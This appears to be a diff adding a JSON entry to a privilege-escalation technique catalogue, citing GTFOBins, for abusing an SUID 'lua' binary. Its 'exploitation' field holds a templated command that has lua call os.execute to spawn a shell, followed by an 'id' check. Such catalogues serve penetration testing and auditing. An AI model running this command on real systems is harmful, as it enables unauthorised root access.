@@ -1,0 +1,11 @@
+{
+  "id": "suid_lua",
+  "category": "SUID_GTFOBINS",
+  "binary": "lua",
+  "cve": null,
+  "exploitation": ["{{binary}} -e 'os.execute(\"{{shell}}\")'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
